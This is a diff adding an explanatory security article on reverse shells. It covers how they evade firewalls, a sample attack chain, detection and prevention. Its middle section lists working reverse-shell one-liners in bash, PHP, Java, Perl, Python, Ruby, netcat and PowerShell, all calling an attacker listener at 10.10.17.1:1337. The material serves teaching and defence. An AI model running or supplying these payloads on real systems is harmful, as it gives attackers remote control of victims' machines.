@@ -1,0 +1,119 @@
+What is a shell?
+
+A shell is a program that lets users (or other programs) use operating system services. This term is typically used to describe command-line interfaces created for that purpose, such as cmd.exe in Windows, but it can also be used to describe graphical user interfaces (GUIs). The name shell comes from the fact that this is the outer layer of the operating system.
+
+Note that many shells are network-enabled (for example, telnet or SSH) and let users send commands to the operating system remotely. Such software is called remote shells.
+How do reverse shells work?
+
+In a typical remote system access scenario, the user has the role of a client, and the target machine acts as a server. The user initiates a remote shell connection while the target system listens for such connections.
+
+In the case of a reverse shell, these roles are switched: the target machine initiates the connection to the user while the user’s computer listens for incoming connections on a specified port.
+
+Reverse shells are often used by attackers because they are not stopped by the most common firewall configurations. The targeted servers usually allow connections only on specific ports, so, for example, a dedicated web server will only accept connections on ports 80 and 443. This makes it impossible to establish a shell listener on the attacked server. Another reason might be that the server is located behind a NAT (network address translation) layer.
+
+On the other hand, firewalls usually do not limit outgoing connections at all, and neither do NATs, so there is nothing to stop an attacker from setting up a server on their own machine and establishing a reverse connection. All the attacker needs is a machine that has a public (routable) IP address and a tool such as netcat to create the listener and bind shell access to it.
+A typical reverse shell attack scenario
+
+Since getting a reverse shell is just one stage of an attack, here is an example chain of events that involves the use of a reverse shell:
+
+    The attacker discovers a remote code execution (RCE) vulnerability in www.example.com and also establishes that www.example.com lets users upload their own images without testing whether the uploaded file is a valid image.
+    The attacker uploads a Python reverse shell script to www.example.com, disguising it as an image by calling the file test.jpg.
+    The attacker uses the RCE vulnerability to execute the uploaded test.jpg Python script.
+    The test.jpg script establishes a connection to port 80 of the attacker’s machine. The attacker is now able to send shell commands to the www.example.com web server.
+    The attacker can now attempt privilege escalation. For example, they may find a vulnerability in the operating system that allows them to gain root access to the server.
+
+Reverse shell examples
+
+Creating a reverse shell is very simple, and you can use a variety of tools and languages to do it. First, you need a listener on your local machine with a public IP. For example, on a Linux machine, all you need is the following netcat command:
+
+ncat -l -p 1337
+
+This establishes the listener on TCP port 1337. Let’s assume the user’s machine is available at the IP address 10.10.17.1. Here’s a selection of one-liners that you can execute on the compromised target machine to create a reverse shell connection with the attacker’s machine.
+Bash reverse shell
+
+The simplest method is to use bash, which is available on almost all Linux machines. This script was tested on Ubuntu 18.04, but not all versions of bash support this function:
+
+/bin/bash -i >& /dev/tcp/10.10.17.1/1337 0>&1
+
+PHP reverse shell
+
+If the target machine is a web server that supports PHP, this language will be an excellent choice for a reverse shell:
+
+php -r '$sock=fsockopen("10.10.17.1",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+If this does not work, you can try replacing &3 with consecutive file descriptors. Another option for PHP is to download and execute a more complex script developed by pentestmonkey.
+Java reverse shell
+
+If the target machine uses Java, try the following simple example:
+
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.17.1/1337;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+Perl reverse shell
+
+Perl is another good candidate for a reverse shell on a web server:
+
+perl -e 'use Socket;$i="10.10.17.1";$p=1337;
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
+open(STDOUT,">&S");open(STDERR,">&S");
+exec("/bin/sh -i");};'
+
+Python reverse shell
+
+Python is commonly used on production systems, so it may be another option for a reverse shell:
+
+python -c 'import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.10.17.1",1337));
+os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);'
+
+Ruby reverse shell
+
+While Ruby is not as common as the other languages, it also makes it possible to create a reverse shell:
+
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.17.1","1337");
+while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end';
+
+or
+
+ruby -rsocket -e'f=TCPSocket.open("10.0.17.1",1337).to_i;
+exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+Netcat reverse shell
+
+Netcat is rarely available on production servers, but if all else fails, the attacker can try the following:
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.1 1337 >/tmp/f
+
+Powershell reverse shell
+
+On Windows machines, you can even create a reverse shell using Powershell. Here’s an example developed by Nikhil SamratAshok Mittal.
+
+$sm=(New-Object Net.Sockets.TCPClient("10.10.17.1",1337)).GetStream();
+[byte[]]$bt=0..255|%{0};
+while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);
+$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));
+$sm.Write($st,0,$st.Length)}
+
+More reverse shells
+
+For an impressive list of reverse shell payloads, you can refer to the Reverse Shell Cheat Sheet maintained by Swissky on GitHub.
+How to detect reverse shells?
+
+Since reverse shells can use encrypted connections and the scripts can be created in so many different languages, there is no simple way to detect whether your system has a reverse shell running. You need detailed forensics, including an audit of all outgoing connections as well as all executable code and scripts in the system. Well-known reverse shell code may be detected by the use of signatures, but professional black-hat hackers create custom scripts to evade signature-based detection. Your best bet is, therefore, to focus on preventing attackers from installing a reverse shell on your system in the first place.
+How to prevent reverse shell use?
+
+In general, a reverse shell is not necessarily malicious and can also be used for legitimate purposes, for example, remote server administration. If you don’t need to use reverse shells, you can try to restrict the available options for creating them, but it is very difficult:
+
+    You can impose strict control of outgoing connections using a firewall. However, this is only possible for very specialized servers, and there is nothing to stop the attacker from opening a listener on a common port such as 80. In such a case, all TCP and UDP connections would also have to be monitored for malicious content.
+    You can disable most tools that would make it possible to create a reverse shell on the local host, but – again – this is only possible for very specialized servers. As shown above, reverse shells can be created using many different tools and languages, so at best, you will only make an attacker’s job a bit more difficult.
+
+Even if you succeed in avoiding reverse shells, there are other methods that attackers can use to establish similar control over a system. For example, in some cases, they can use web shells instead.
+How to avoid attacks based on reverse shells?
+
+Since preventing the use of reverse shells is very difficult and not bulletproof, the best way to avoid having a reverse shell installed on your server is to make sure the server is not susceptible to initial attacks. And the most common attacks that lead to the attacker installing a reverse shell are web attacks that exploit vulnerabilities such as remote code execution (RCE), local file inclusion (LFI), remote file inclusion (RFI), SQL injection, and others.
+
+Therefore, the best way to avoid attacks that involve reverse shells is to prevent web vulnerabilities – and the best way to do that is to include vulnerability checks in the software development lifecycle through the use of DAST and SCA tools with proper vulnerability management.
